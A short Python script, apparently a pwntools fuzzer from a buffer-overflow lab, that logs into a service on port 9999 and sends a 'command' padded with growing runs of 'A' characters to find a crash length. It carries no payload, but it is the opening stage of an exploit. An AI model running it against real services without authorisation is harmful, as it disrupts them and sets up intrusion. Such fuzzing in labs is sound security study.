#!/usr/bin/env python

for length in range(100, 2000, 100):
  p = remote('192.168.x.x', 9999)
  p.recv(1024)
  p.send("USER Anonymous")
  p.recv()
  p.send("PASS anonymous")
  p.recv()
  p.send("command " + "A" * length)
  print("sending total %s bytes" % length)
  p.close()
